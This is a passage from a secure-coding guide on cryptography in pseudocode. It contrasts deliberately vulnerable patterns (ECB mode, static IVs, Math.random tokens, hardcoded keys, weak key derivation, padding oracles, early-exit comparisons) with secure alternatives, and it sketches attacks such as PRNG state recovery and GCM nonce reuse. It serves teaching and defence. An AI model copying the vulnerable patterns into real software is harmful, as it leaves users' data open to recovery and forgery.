// VULNERABLE: Default mode may be ECB in some libraries
function simpleEncrypt(data, key):
    cipher = AES.new(key)  // Some libraries default to ECB!
    return cipher.encrypt(padData(data))

// VULNERABLE: Explicit ECB for "simplicity"
function encryptUserData(userData, encryptionKey):
    algorithm = "AES/ECB/PKCS5Padding"  // Java-style
    cipher = Cipher.getInstance(algorithm)
    cipher.init(ENCRYPT_MODE, encryptionKey)
    return cipher.doFinal(userData)

// VULNERABLE: Assuming any AES is secure
function protectSensitiveData(data, key):
    // "AES is strong encryption" - but ECB mode is not
    encryptor = AESEncryptor(key, mode = "ECB")
    return encryptor.encrypt(data)
```

**Why This Is Dangerous:**
- ECB encrypts identical plaintext blocks to identical ciphertext blocks
- Patterns in plaintext are preserved in ciphertext
- Famous example: ECB-encrypted images show the original image outline
- No semantic security—attacker learns information about plaintext structure
- Block manipulation attacks possible (swap, delete, duplicate blocks)

**Visual Demonstration:**
```pseudocode
// Original image (bitmap of a penguin):
// ████████████████
// ██    ████    ██
// ██  ██████  ██
// ██████████████
// ████    ████████
// ████████████████

// After ECB encryption:
// ????????????????   ← Still shows penguin shape!
// ??    ????    ??   ← Identical colors → identical ciphertext
// ??  ??????  ??
// ??????????????
// ????    ????????
// ????????????????

// After CBC/GCM encryption:
// ????????????????   ← Random appearance
// ????????????????   ← No pattern visible
// ????????????????
// ????????????????
// ????????????????
// ????????????????
```

---

### BAD Example 3: Static IVs / Nonces

```pseudocode
// VULNERABLE: Hardcoded IV
STATIC_IV = bytes([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])

function encryptMessage(plaintext, key):
    cipher = AES.new(key, AES.MODE_CBC, iv = STATIC_IV)
    return cipher.encrypt(padData(plaintext))

// VULNERABLE: Same IV for all encryptions
class Encryptor:
    IV = generateRandomBytes(16)  // Generated ONCE at startup

    function encrypt(data, key):
        cipher = createCipher("AES-CBC", key, this.IV)
        return cipher.encrypt(data)

// VULNERABLE: Predictable IV (counter without random start)
nonce_counter = 0
function encryptWithNonce(plaintext, key):
    nonce_counter = nonce_counter + 1
    nonce = intToBytes(nonce_counter, 12)  // Predictable!
    return AES_GCM_encrypt(key, nonce, plaintext)

// VULNERABLE: IV derived from predictable data
function encryptRecord(userId, data, key):
    iv = sha256(toString(userId))[:16]  // Same IV for same user!
    return AES_CBC_encrypt(key, iv, data)

// VULNERABLE: Timestamp-based IV
function timeBasedEncrypt(data, key):
    iv = sha256(toString(getCurrentTimestamp()))[:16]
    return AES_CBC_encrypt(key, iv, data)
    // Problem: Collisions if encrypted in same second
```

**Why This Is Dangerous:**
- Same IV + same key = identical ciphertext for identical plaintext (breaks semantic security)
- In CBC mode: enables plaintext recovery through XOR analysis across messages
- In CTR mode: key stream reuse → XOR of plaintexts recoverable
- In GCM mode: nonce reuse is catastrophic—key recovery possible
- Predictable IVs enable chosen-plaintext attacks

**GCM Nonce Reuse Attack:**
```pseudocode
// If same nonce used twice with same key in GCM:
// Message 1: plaintext1, ciphertext1, tag1
// Message 2: plaintext2, ciphertext2, tag2

// Attacker can compute:
// - XOR of plaintext1 and plaintext2
// - Eventually recover the authentication key H
// - Forge arbitrary messages with valid tags

// This is a CATASTROPHIC failure of GCM mode
// "Nonce misuse resistance" modes exist (GCM-SIV) for this reason
```

---

### BAD Example 4: Math.random() for Security

```pseudocode
// VULNERABLE: Math.random for token generation
function generateResetToken():
    token = ""
    for i in range(32):
        token = token + toString(floor(random() * 16), base = 16)
    return token

// VULNERABLE: Math.random for session ID
function createSessionId():
    return "session_" + toString(random() * 1000000000)

// VULNERABLE: Seeded random with predictable seed
function generateApiKey(userId):
    setSeed(userId * getCurrentTimestamp())
    key = ""
    for i in range(32):
        key = key + randomChoice(ALPHANUMERIC_CHARS)
    return key

// VULNERABLE: Using non-crypto random for encryption IV
function quickEncrypt(data, key):
    iv = []
    for i in range(16):
        iv.append(floor(random() * 256))
    return AES_CBC_encrypt(key, iv, data)

// VULNERABLE: JavaScript Math.random() is NOT cryptographic
function generateToken():
    return btoa(String.fromCharCode.apply(null,
        Array.from({length: 32}, () => Math.floor(Math.random() * 256))
    ))
```

**Why This Is Dangerous:**
- Math.random() uses predictable pseudo-random number generators (PRNG)
- Internal state can be recovered from ~600 outputs (in V8 engine)
- Once state is known, all past and future values are predictable
- Session tokens, API keys, and reset tokens become guessable
- Many PRNG implementations have short periods or weak seeding

**State Recovery Attack:**
```pseudocode
// Attacker collects multiple password reset tokens
tokens_observed = [
    "a3f7c2e9b1d4...",  // Token 1
    "8e2a5f1c9b3d...",  // Token 2
    // ... collect ~30-50 tokens
]

// Using z3 SMT solver or custom reversing:
function recoverMathRandomState(observed_outputs):
    // V8's xorshift128+ can be reversed
    // Once state recovered, predict next token
    state = reverseEngineerState(observed_outputs)
    next_token = predictNextOutput(state)
    return next_token

// Attacker generates password reset for victim
// Then predicts the token value
// Completes password reset without email access
```

---

### BAD Example 5: Hardcoded Symmetric Keys

```pseudocode
// VULNERABLE: Key in source code
ENCRYPTION_KEY = "MySecretKey12345"

function encryptUserData(data):
    return AES_encrypt(ENCRYPTION_KEY, data)

// VULNERABLE: Key derived from application constant
function getEncryptionKey():
    return sha256(APPLICATION_NAME + ENVIRONMENT + "secret")

// VULNERABLE: Same key for all users
MASTER_KEY = bytes.fromhex("0123456789abcdef0123456789abcdef")

function encryptForUser(userId, data):
    return AES_encrypt(MASTER_KEY, data)

// VULNERABLE: Key in configuration file (committed to git)
// config.py:
CRYPTO_CONFIG = {
    "encryption_key": "dGhpcyBpcyBhIHNlY3JldCBrZXk=",  // Base64 encoded
    "hmac_key": "another_secret_key_here"
}

// VULNERABLE: Weak key (too short)
function quickEncrypt(data):
    key = "short"  // 5 bytes, not 16/24/32
    return AES_encrypt(pad(key, 16), data)  // Padded with zeros!
```

**Why This Is Dangerous:**
- Keys in source code are exposed in version control history forever
- Hardcoded keys cannot be rotated without code deployment
- Compilation/decompilation exposes keys in binaries
- Single key compromise affects all encrypted data
- Weak/short keys can be brute-forced
- Key derivation from predictable inputs allows reconstruction

---

### BAD Example 6: Weak Key Derivation

```pseudocode
// VULNERABLE: Direct use of password as key
function deriveKey(password):
    return password.encode()[:32]  // Truncate or pad to key size

// VULNERABLE: Simple hash as key derivation
function passwordToKey(password):
    return sha256(password)  // Single round, no salt

// VULNERABLE: MD5-based key derivation
function getKeyFromPassword(password, salt):
    return md5(password + salt)

// VULNERABLE: Insufficient iterations
function deriveKeyPBKDF2(password, salt):
    return PBKDF2(password, salt, iterations = 1000)
    // 2025 recommendation: minimum 600,000 for SHA256

// VULNERABLE: Using key derivation output directly for multiple purposes
function setupCrypto(password, salt):
    derived = PBKDF2(password, salt, iterations = 100000, keyLength = 64)
    encryptionKey = derived[:32]   // First half
    hmacKey = derived[32:]         // Second half
    // Problem: related keys, should use separate derivations

// VULNERABLE: Weak salt (too short, predictable, or reused)
function deriveKeyWithWeakSalt(password):
    salt = "salt"  // Static salt defeats purpose
    return PBKDF2(password, salt, iterations = 100000)
```

**Why This Is Dangerous:**
- Direct password use gives attackers dictionary attack advantage
- Single-hash derivation enables GPU-accelerated brute force
- Low iteration counts make PBKDF2/bcrypt fast to attack
- MD5 key derivation inherits all MD5 weaknesses
- Static/weak salt enables precomputation attacks
- Related key derivation can expose cryptographic weaknesses

**Iteration Count Guidance (2025):**
```pseudocode
// PBKDF2-SHA256 minimum iterations by use case:
// - Interactive login (100ms budget): 600,000 iterations
// - Background/async (1s budget): 2,000,000 iterations
// - High-security (offline storage): 10,000,000 iterations

// bcrypt cost factor:
// - Minimum 2025: cost = 12 (about 250ms)
// - Recommended: cost = 13-14
// - High-security: cost = 15+

// Argon2id parameters (2025):
// - Memory: 64 MB minimum, 256 MB recommended
// - Iterations: 3 minimum
// - Parallelism: match available cores
// - Argon2id recommended over Argon2i or Argon2d
```

---

## GOOD Examples: Secure Cryptographic Patterns

### GOOD Example 1: Proper Password Hashing with bcrypt/Argon2

```pseudocode
// SECURE: bcrypt with appropriate cost factor
function hashPassword(password):
    // Cost factor 12 = ~250ms on modern hardware
    // Increase cost factor annually as hardware improves
    cost = 12
    return bcrypt.hash(password, cost)

function verifyPassword(password, storedHash):
    // bcrypt.verify handles timing-safe comparison internally
    return bcrypt.verify(password, storedHash)

// SECURE: Argon2id (recommended for new applications)
function hashPasswordArgon2(password):
    // Argon2id: hybrid resistant to both side-channel and GPU attacks
    options = {
        type: ARGON2ID,
        memoryCost: 65536,    // 64 MB
        timeCost: 3,          // 3 iterations
        parallelism: 4,       // 4 parallel threads
        hashLength: 32        // 256-bit output
    }
    return argon2.hash(password, options)

function verifyPasswordArgon2(password, storedHash):
    return argon2.verify(storedHash, password)

// SECURE: scrypt for memory-hard hashing
function hashPasswordScrypt(password):
    // N = CPU/memory cost (power of 2)
    // r = block size
    // p = parallelization parameter
    salt = generateSecureRandom(16)
    hash = scrypt(password, salt, N = 2^17, r = 8, p = 1, keyLen = 32)
    return encodeSaltAndHash(salt, hash)

// SECURE: Migrating from weak to strong hashing
function upgradePasswordHash(userId, password, currentHash):
    // Verify against old hash
    if legacyVerify(password, currentHash):
        // Re-hash with modern algorithm
        newHash = hashPasswordArgon2(password)
        database.update("users", userId, {"password_hash": newHash})
        return true
    return false
```

**Why This Is Secure:**
- bcrypt/argon2/scrypt are deliberately slow (memory-hard)
- Built-in salt generation and storage
- Timing-safe comparison built into verify functions
- Configurable work factors allow future-proofing
- Argon2id is resistant to both GPU attacks and side-channel attacks

---

### GOOD Example 2: Authenticated Encryption (GCM Mode)

```pseudocode
// SECURE: AES-256-GCM with proper nonce handling
function encryptAESGCM(plaintext, key):
    // Generate cryptographically random 96-bit nonce
    nonce = generateSecureRandom(12)

    cipher = createCipher("AES-256-GCM", key)
    cipher.setNonce(nonce)

    // Optional: Add authenticated additional data (AAD)
    // AAD is authenticated but NOT encrypted
    aad = "context:user_data:v1"
    cipher.setAAD(aad)

    ciphertext = cipher.encrypt(plaintext)
    authTag = cipher.getAuthTag()  // 128-bit tag

    // Return nonce + tag + ciphertext (all needed for decryption)
    return nonce + authTag + ciphertext

function decryptAESGCM(encryptedData, key):
    // Extract components
    nonce = encryptedData[:12]
    authTag = encryptedData[12:28]
    ciphertext = encryptedData[28:]

    cipher = createCipher("AES-256-GCM", key)
    cipher.setNonce(nonce)
    cipher.setAAD("context:user_data:v1")  // Must match encryption
    cipher.setAuthTag(authTag)

    try:
        plaintext = cipher.decrypt(ciphertext)
        return plaintext
    catch AuthenticationError:
        // Tag verification failed - data tampered or wrong key
        log.warn("Decryption authentication failed - possible tampering")
        return null

// SECURE: XChaCha20-Poly1305 (extended nonce variant)
function encryptXChaCha(plaintext, key):
    // 192-bit nonce - safe for random generation
    nonce = generateSecureRandom(24)

    ciphertext, tag = xchachapoly.encrypt(key, nonce, plaintext)

    return nonce + tag + ciphertext
```

**Why This Is Secure:**
- GCM provides both confidentiality AND integrity
- Authentication tag detects any tampering
- 96-bit nonces are safe for random generation up to ~2^32 messages per key
- XChaCha20 has 192-bit nonce, safe for effectively unlimited messages
- AAD allows binding ciphertext to context (prevents cross-context attacks)

---

### GOOD Example 3: Proper IV/Nonce Generation

```pseudocode
// SECURE: Random IV for CBC mode
function encryptCBC(plaintext, key):
    // 128-bit random IV for AES
    iv = generateSecureRandom(16)

    cipher = createCipher("AES-256-CBC", key)
    ciphertext = cipher.encrypt(plaintext, iv)

    // Prepend IV to ciphertext (IV doesn't need to be secret)
    return iv + ciphertext

function decryptCBC(encryptedData, key):
    iv = encryptedData[:16]
    ciphertext = encryptedData[16:]

    cipher = createCipher("AES-256-CBC", key)
    return cipher.decrypt(ciphertext, iv)

// SECURE: Counter-based nonce with random prefix (for GCM)
class SecureNonceGenerator:
    // Random 32-bit prefix + 64-bit counter
    // Safe for 2^64 messages with same key

    function __init__():
        this.prefix = generateSecureRandom(4)  // 32-bit random
        this.counter = 0
        this.lock = Mutex()

    function generate():
        this.lock.acquire()
        this.counter = this.counter + 1
        if this.counter >= 2^64:
            throw Error("Nonce counter exhausted - rotate key")
        nonce = this.prefix + intToBytes(this.counter, 8)
        this.lock.release()
        return nonce

// SECURE: Synthetic IV (SIV) for nonce-misuse resistance
function encryptSIV(plaintext, key):
    // AES-GCM-SIV: Safe even if nonce is accidentally repeated
    nonce = generateSecureRandom(12)
    ciphertext = AES_GCM_SIV_encrypt(key, nonce, plaintext)
    return nonce + ciphertext
    // Note: Repeated nonce only leaks if same plaintext encrypted
```

**Why This Is Secure:**
- Random IVs prevent pattern analysis across messages
- Prepending IV to ciphertext ensures IV is always available for decryption
- Counter with random prefix prevents nonce collision across instances
- SIV modes provide safety net against accidental nonce reuse

---

### GOOD Example 4: Cryptographically Secure Random

```pseudocode
// SECURE: Using OS/platform CSPRNG

// Node.js
function generateSecureRandom(length):
    return crypto.randomBytes(length)

// Python
function generateSecureRandom(length):
    return secrets.token_bytes(length)

// Java
function generateSecureRandom(length):
    random = SecureRandom.getInstanceStrong()
    bytes = new byte[length]
    random.nextBytes(bytes)
    return bytes

// Go
function generateSecureRandom(length):
    bytes = make([]byte, length)
    _, err = crypto_rand.Read(bytes)
    if err != nil:
        panic("CSPRNG failure")
    return bytes

// SECURE: Token generation for URLs/APIs
function generateUrlSafeToken(length):
    // Generate random bytes, encode to URL-safe base64
    randomBytes = generateSecureRandom(length)
    return base64UrlEncode(randomBytes)

function generateResetToken():
    // 256 bits of entropy for password reset token
    return generateUrlSafeToken(32)

function generateApiKey():
    // Prefix for identification + random component
    prefix = "sk_live_"
    randomPart = generateUrlSafeToken(24)
    return prefix + randomPart

// SECURE: Random number in range
function secureRandomInt(min, max):
    range = max - min + 1
    bytesNeeded = ceil(log2(range) / 8)

    // Rejection sampling to avoid modulo bias
    while true:
        randomBytes = generateSecureRandom(bytesNeeded)
        value = bytesToInt(randomBytes)
        if value < (2^(bytesNeeded*8) / range) * range:
            return min + (value % range)
```

**Why This Is Secure:**
- CSPRNG (Cryptographically Secure PRNG) uses OS entropy sources
- Cannot be predicted even with complete knowledge of outputs
- Proper rejection sampling avoids modulo bias
- Standard libraries provide secure defaults when used correctly

---

### GOOD Example 5: Key Derivation Functions

```pseudocode
// SECURE: PBKDF2 with sufficient iterations
function deriveKeyPBKDF2(password, purpose):
    // Generate unique salt per derivation
    salt = generateSecureRandom(16)

    // 600,000 iterations minimum for SHA-256 (2025)
    iterations = 600000

    // Derive key of required length
    derivedKey = PBKDF2(
        password = password,
        salt = salt,
        iterations = iterations,
        keyLength = 32,  // 256 bits
        hashFunction = SHA256
    )

    // Store salt with derived key for later verification
    return {salt: salt, key: derivedKey}

// SECURE: HKDF for deriving multiple keys from one secret
function deriveMultipleKeys(masterSecret, purpose):
    // HKDF-Extract: Create pseudorandom key from input
    salt = generateSecureRandom(32)
    prk = HKDF_Extract(salt, masterSecret)

    // HKDF-Expand: Derive purpose-specific keys
    encryptionKey = HKDF_Expand(prk, info = "encryption", length = 32)
    hmacKey = HKDF_Expand(prk, info = "authentication", length = 32)
    searchKey = HKDF_Expand(prk, info = "search-index", length = 32)

    return {
        encryption: encryptionKey,
        hmac: hmacKey,
        search: searchKey,
        salt: salt  // Store for re-derivation
    }

// SECURE: Argon2 for password-based key derivation
function deriveKeyFromPassword(password, salt = null):
    if salt == null:
        salt = generateSecureRandom(16)

    derivedKey = argon2id(
        password = password,
        salt = salt,
        memoryCost = 65536,    // 64 MB
        timeCost = 3,
        parallelism = 4,
        outputLength = 32
    )

    return {key: derivedKey, salt: salt}

// SECURE: Key derivation with domain separation
function deriveKeyWithContext(masterKey, context, subkeyId):
    // Context prevents cross-purpose key use
    info = context + ":" + subkeyId
    return HKDF_Expand(masterKey, info, 32)

// Example: Derive per-user encryption keys
function getUserEncryptionKey(masterKey, userId):
    return deriveKeyWithContext(masterKey, "user-data-encryption", userId)
```

**Why This Is Secure:**
- High iteration counts make brute-force impractical
- HKDF properly separates multiple keys from one source
- Domain separation prevents keys derived for one purpose being used for another
- Argon2 provides memory-hard protection against GPU attacks
- Unique salt per derivation prevents precomputation attacks

---

### GOOD Example 6: Key Rotation Patterns

```pseudocode
// SECURE: Key versioning for rotation
class KeyManager:
    function __init__(keyStore):
        this.keyStore = keyStore
        this.currentKeyVersion = keyStore.getCurrentVersion()

    function encrypt(plaintext):
        key = this.keyStore.getKey(this.currentKeyVersion)
        nonce = generateSecureRandom(12)

        ciphertext = AES_GCM_encrypt(key, nonce, plaintext)

        // Include key version in output for decryption
        return encodeVersionedCiphertext(
            version = this.currentKeyVersion,
            nonce = nonce,
            ciphertext = ciphertext
        )

    function decrypt(encryptedData):
        version, nonce, ciphertext = decodeVersionedCiphertext(encryptedData)

        // Fetch correct key version (may be old version)
        key = this.keyStore.getKey(version)
        if key == null:
            throw KeyNotFoundError("Key version " + version + " not available")

        return AES_GCM_decrypt(key, nonce, ciphertext)

    function rotateKey():
        newVersion = this.currentKeyVersion + 1
        newKey = generateSecureRandom(32)
        this.keyStore.storeKey(newVersion, newKey)
        this.currentKeyVersion = newVersion

        // Schedule background re-encryption of old data
        scheduleReEncryption(newVersion - 1, newVersion)

// SECURE: Re-encryption during key rotation
function reEncryptData(dataId, oldVersion, newVersion, keyManager):
    // Fetch encrypted data
    encryptedData = database.get("encrypted_data", dataId)

    // Verify it uses old key version
    currentVersion = extractKeyVersion(encryptedData)
    if currentVersion >= newVersion:
        return  // Already using new or newer key

    // Decrypt with old key, re-encrypt with new
    plaintext = keyManager.decrypt(encryptedData)
    newEncryptedData = keyManager.encrypt(plaintext)

    // Atomic update
    database.update("encrypted_data", dataId, {
        "data": newEncryptedData,
        "key_version": newVersion,
        "rotated_at": getCurrentTimestamp()
    })

// SECURE: Key wrapping for storage
function storeEncryptionKey(keyToStore, masterKey):
    // Wrap (encrypt) the key with master key
    nonce = generateSecureRandom(12)
    wrappedKey = AES_GCM_encrypt(masterKey, nonce, keyToStore)

    return {
        wrapped_key: wrappedKey,
        nonce: nonce,
        algorithm: "AES-256-GCM",
        created_at: getCurrentTimestamp()
    }

function retrieveEncryptionKey(wrappedKeyData, masterKey):
    return AES_GCM_decrypt(
        masterKey,
        wrappedKeyData.nonce,
        wrappedKeyData.wrapped_key
    )
```

**Why This Is Secure:**
- Key versioning allows old data to remain decryptable during rotation
- Background re-encryption gradually migrates all data to new key
- Key wrapping protects stored keys at rest
- Gradual rotation minimizes operational risk

---

## Edge Cases Section

### Edge Case 1: Padding Oracle Vulnerabilities

```pseudocode
// VULNERABLE: Revealing padding validity in error messages
function decryptCBC_vulnerable(ciphertext, key, iv):
    try:
        plaintext = AES_CBC_decrypt(key, iv, ciphertext)
        unpadded = removePKCS7Padding(plaintext)
        return {success: true, data: unpadded}
    catch PaddingError:
        return {success: false, error: "Invalid padding"}  // ORACLE!
    catch DecryptionError:
        return {success: false, error: "Decryption failed"}

// Attack: Padding oracle allows full plaintext recovery
// Attacker modifies ciphertext bytes, observes padding errors
// ~128 requests per byte to recover plaintext (on average)

// SECURE: Use authenticated encryption (GCM) or constant-time handling
function decryptCBC_secure(ciphertext, key, iv):
    try:
        // First verify HMAC before any decryption
        providedHmac = ciphertext[-32:]
        ciphertextData = ciphertext[:-32]

        expectedHmac = HMAC_SHA256(key, iv + ciphertextData)
        if not constantTimeEquals(providedHmac, expectedHmac):
            return {success: false, error: "Decryption failed"}  // Generic error

        plaintext = AES_CBC_decrypt(key, iv, ciphertextData)
        unpadded = removePKCS7Padding(plaintext)
        return {success: true, data: unpadded}
    catch:
        return {success: false, error: "Decryption failed"}  // Same error always

// BEST: Just use GCM which prevents this class of attack entirely
```

**Lesson Learned:**
- Never reveal whether padding was valid or invalid
- Always use authenticated encryption (encrypt-then-MAC or GCM)
- Return identical errors for all decryption failures

---

### Edge Case 2: Length Extension Attacks

```pseudocode
// VULNERABLE: Using hash(secret + message) for authentication
function createAuthToken(secretKey, message):
    return sha256(secretKey + message)  // Length extension vulnerable!

function verifyAuthToken(secretKey, message, token):
    expected = sha256(secretKey + message)
    return token == expected

// Attack: Attacker knows hash(secret + message) and length of secret
// Can compute hash(secret + message + padding + attacker_data)
// Without knowing the secret!

// Example attack:
// Original: hash(secret + "amount=100") = abc123...
// Attacker computes: hash(secret + "amount=100" + padding + "&amount=999")
// Server verifies this as valid!

// SECURE: Use HMAC
function createAuthTokenSecure(secretKey, message):
    return HMAC_SHA256(secretKey, message)

function verifyAuthTokenSecure(secretKey, message, token):
    expected = HMAC_SHA256(secretKey, message)
    return constantTimeEquals(token, expected)

// SECURE: Use hash(message + secret) - prevents extension but HMAC preferred
// SECURE: Use SHA-3/SHA-512/256 (resistant to length extension)
function alternativeAuth(secretKey, message):
    return SHA3_256(secretKey + message)  // SHA-3 is resistant
```

**Lesson Learned:**
- Never use hash(key + message) for authentication
- HMAC is specifically designed to prevent length extension
- SHA-3 family is resistant but HMAC is still recommended for consistency

---

### Edge Case 3: Timing Attacks on Comparison

```pseudocode
// VULNERABLE: Early-exit string comparison
function verifyToken(providedToken, expectedToken):
    if length(providedToken) != length(expectedToken):
        return false
    for i in range(length(providedToken)):
        if providedToken[i] != expectedToken[i]:
            return false  // Early exit reveals position of first difference
    return true

// Attack: Timing differences reveal correct characters
// Correct first char: ~1μs longer than wrong first char
// Attacker can brute-force character-by-character

// VULNERABLE: Using == operator (language-dependent timing)
function checkHmac(provided, expected):
    return provided == expected  // May have variable-time implementation

// SECURE: Constant-time comparison
function constantTimeEquals(a, b):
    if length(a) != length(b):
        // Still constant-time for the comparison
        // Length difference may leak - consider padding
        return false

    result = 0
    for i in range(length(a)):
        // XOR and OR accumulate differences without early exit
        result = result | (a[i] XOR b[i])
    return result == 0

// SECURE: Using crypto library comparison
function verifyHmacSecure(message, providedHmac, key):
    expectedHmac = HMAC_SHA256(key, message)
    return crypto.timingSafeEqual(providedHmac, expectedHmac)

// SECURE: Double-HMAC comparison (timing-safe by design)
function verifyWithDoubleHmac(message, providedMac, key):
    expectedMac = HMAC_SHA256(key, message)
    // Compare HMACs of the MACs - timing doesn't leak original MAC
    return HMAC_SHA256(key, providedMac) == HMAC_SHA256(key, expectedMac)
```

**Lesson Learned:**
- Use constant-time comparison for all secret-dependent operations
- Most languages have crypto libraries with timing-safe functions
- Double-HMAC trick works when constant-time compare isn't available

---

### Edge Case 4: Key Reuse Across Contexts

```pseudocode
// VULNERABLE: Same key for encryption and authentication
SHARED_KEY = loadKey("master")

function encryptData(data):
    return AES_GCM_encrypt(SHARED_KEY, generateNonce(), data)

function signData(data):
    return HMAC_SHA256(SHARED_KEY, data)  // Same key!

// Problem: Cryptographic interactions between uses
// Some attacks become possible when key is used in multiple algorithms

// VULNERABLE: Same key for different users/tenants
function encryptForTenant(tenantId, data):
    return AES_GCM_encrypt(MASTER_KEY, generateNonce(), data)
    // All tenants share encryption key - one compromise = all compromised

// SECURE: Derive separate keys for each purpose
MASTER_KEY = loadKey("master")

function getEncryptionKey():
    return HKDF_Expand(MASTER_KEY, "encryption-aes-256-gcm", 32)

function getAuthenticationKey():
    return HKDF_Expand(MASTER_KEY, "authentication-hmac-sha256", 32)

function getSearchKey():
    return HKDF_Expand(MASTER_KEY, "searchable-encryption", 32)

// SECURE: Per-tenant key derivation
function getTenantEncryptionKey(tenantId):
    // Each tenant gets unique derived key
    info = "tenant-encryption:" + tenantId
    return HKDF_Expand(MASTER_KEY, info, 32)

function encryptForTenantSecure(tenantId, data):
    tenantKey = getTenantEncryptionKey(tenantId)
    return AES_GCM_encrypt(tenantKey, generateNonce(), data)
```

**Lesson Learned:**
- Always derive separate keys for different cryptographic operations
- Use domain separation (different "info" parameters) in HKDF
- Per-tenant/per-user key derivation limits blast radius of compromise

---

## Common Mistakes Section

### Common Mistake 1: Using Encryption Without Authentication

```pseudocode
// COMMON MISTAKE: CBC encryption without HMAC
function encryptDataWrong(data, key):
    iv = generateSecureRandom(16)
    ciphertext = AES_CBC_encrypt(key, iv, data)
    return iv + ciphertext
    // Missing: No way to detect tampering!

// Attack: Bit-flipping in CBC mode
// Flipping bit N in ciphertext block C[i] flips bit N in plaintext block P[i+1]
// Attacker can modify data without detection

// Example: Encrypted JSON {"admin": false, "amount": 100}
// Attacker can flip bits to change "false" to "true" or modify amount

// CORRECT: Encrypt-then-MAC
function encryptDataCorrect(data, encKey, macKey):
    iv = generateSecureRandom(16)
    ciphertext = AES_CBC_encrypt(encKey, iv, data)

    // MAC covers IV and ciphertext
    mac = HMAC_SHA256(macKey, iv + ciphertext)

    return iv + ciphertext + mac

function decryptDataCorrect(encrypted, encKey, macKey):
    iv = encrypted[:16]
    mac = encrypted[-32:]
    ciphertext = encrypted[16:-32]

    // Verify MAC FIRST, before any decryption
    expectedMac = HMAC_SHA256(macKey, iv + ciphertext)
    if not constantTimeEquals(mac, expectedMac):
        throw IntegrityError("Data has been tampered with")

    return AES_CBC_decrypt(encKey, iv, ciphertext)

// BETTER: Just use GCM which includes authentication
function encryptDataBest(data, key):
    nonce = generateSecureRandom(12)
    ciphertext, tag = AES_GCM_encrypt(key, nonce, data)
    return nonce + ciphertext + tag
```

**Solution:**
- Always use authenticated encryption (GCM, ChaCha20-Poly1305)
- If using CBC, add HMAC with encrypt-then-MAC pattern
- Verify authentication tag BEFORE decryption

---

### Common Mistake 2: Confusing Encoding with Encryption

```pseudocode
// COMMON MISTAKE: Base64 as "encryption"
function "encrypt"Data(sensitiveData):
    return base64Encode(sensitiveData)  // NOT ENCRYPTION!

function "decrypt"Data(encodedData):
    return base64Decode(encodedData)

// COMMON MISTAKE: XOR with short key as encryption
function "encrypt"WithXor(data, password):
    key = password.repeat(ceil(length(data) / length(password)))
    return xor(data, key)  // Trivially broken with frequency analysis

// COMMON MISTAKE: ROT13 or character substitution
function "encrypt"Text(text):
    return rot13(text)  // No security at all

// COMMON MISTAKE: Obfuscation ≠ encryption
function storeApiKey(apiKey):
    obfuscated = ""
    for char in apiKey:
        obfuscated += chr(ord(char) + 5)  // Just shifted characters
    return obfuscated

// COMMON MISTAKE: Custom "encryption" algorithm
function myEncrypt(data, key):
    result = ""
    for i, char in enumerate(data):
        newChar = chr((ord(char) + ord(key[i % len(key)]) * 7) % 256)
        result += newChar
    return result  // Easily broken - don't invent crypto!
```

**Reality Check:**
| Method | Security Level | Use Case |
|--------|----------------|----------|
| Base64 | 0 (None) | Binary-to-text encoding only |
| ROT13 | 0 (None) | Jokes, spoiler hiding |
| XOR with repeated key | Trivially broken | Never use |
| Homegrown "encryption" | Unknown, likely broken | Never use |
| AES-GCM with random key | Strong | Actual encryption |

**Solution:**
- Use standard algorithms: AES-GCM, ChaCha20-Poly1305
- Never invent cryptographic algorithms
- Encoding (Base64, hex) is for representation, not security

---

### Common Mistake 3: Improper Key Storage After Generation

```pseudocode
// COMMON MISTAKE: Logging the key
function generateAndStoreKey():
    key = generateSecureRandom(32)
    log.info("Generated new encryption key: " + hexEncode(key))  // LOGGED!
    return key

// COMMON MISTAKE: Key in config file committed to git
// config.json:
{
    "database_url": "...",
    "encryption_key": "a1b2c3d4e5f6..."  // Will be in git history forever
}

// COMMON MISTAKE: Key in environment variable visible in process list
// Launching: ENCRYPTION_KEY=secret123 ./myapp
// `ps aux` shows: myapp ENCRYPTION_KEY=secret123

// COMMON MISTAKE: Key stored in database alongside encrypted data
function storeEncryptedData(userId, sensitiveData):
    key = generateSecureRandom(32)
    encrypted = AES_GCM_encrypt(key, generateNonce(), sensitiveData)
    database.insert("user_data", {
        user_id: userId,
        encrypted_data: encrypted,
        encryption_key: key  // KEY NEXT TO DATA = pointless encryption
    })

// COMMON MISTAKE: Key derivation material stored insecurely
function setupEncryption(password):
    salt = generateSecureRandom(16)
    key = deriveKey(password, salt)

    // Storing in easily accessible location
    localStorage.setItem("encryption_salt", salt)
    localStorage.setItem("derived_key", key)  // KEY IN BROWSER STORAGE!
```

**Secure Key Storage Patterns:**
```pseudocode
// SECURE: Using a key management service (KMS)
function storeKeySecurely(keyId, keyMaterial):
    // AWS KMS, Azure Key Vault, GCP KMS, HashiCorp Vault
    kms.storeKey(keyId, keyMaterial, {
        rotation_period: "90 days",
        deletion_protection: true,
        access_policy: restrictedPolicy
    })

// SECURE: Key wrapped with hardware security module (HSM)
function wrapKeyForStorage(dataKey):
    wrappingKey = hsm.getWrappingKey()  // Never leaves HSM
    wrappedKey = hsm.wrapKey(dataKey, wrappingKey)
    return wrappedKey  // Safe to store - can only unwrap with HSM

// SECURE: Envelope encryption pattern
function envelopeEncrypt(data):
    // Generate data encryption key (DEK)
    dek = generateSecureRandom(32)

    // Encrypt data with DEK
    encryptedData = AES_GCM_encrypt(dek, generateNonce(), data)

    // Encrypt DEK with key encryption key (KEK) from KMS
    encryptedDek = kms.encrypt(dek)

    // Store encrypted DEK with encrypted data
    return {
        encrypted_data: encryptedData,
        encrypted_key: encryptedDek,  // DEK is encrypted, safe to store
        kms_key_id: kms.getCurrentKeyId()
    }
```

---

## Algorithm Selection Guidance

### Symmetric Encryption

| Algorithm | Key Size | Use Case | Notes |
|-----------|----------|----------|-------|
| **AES-256-GCM** | 256 bits | General purpose | Recommended default, 96-bit nonce |
| **ChaCha20-Poly1305** | 256 bits | Performance-sensitive, mobile | Faster without AES-NI hardware |
| **XChaCha20-Poly1305** | 256 bits | High-volume encryption | 192-bit nonce, safe for random generation |
| **AES-256-GCM-SIV** | 256 bits | Nonce-misuse resistant | Slightly slower, safer with accidental reuse |

**Avoid:** DES, 3DES, RC4, Blowfish, AES-ECB, AES-CBC without HMAC

### Password Hashing

| Algorithm | Memory | Use Case | Notes |
|-----------|--------|----------|-------|
| **Argon2id** | 64+ MB | New applications | Best protection, memory-hard |
| **bcrypt** | N/A | Legacy compatibility | Widely supported, cost 12+ |
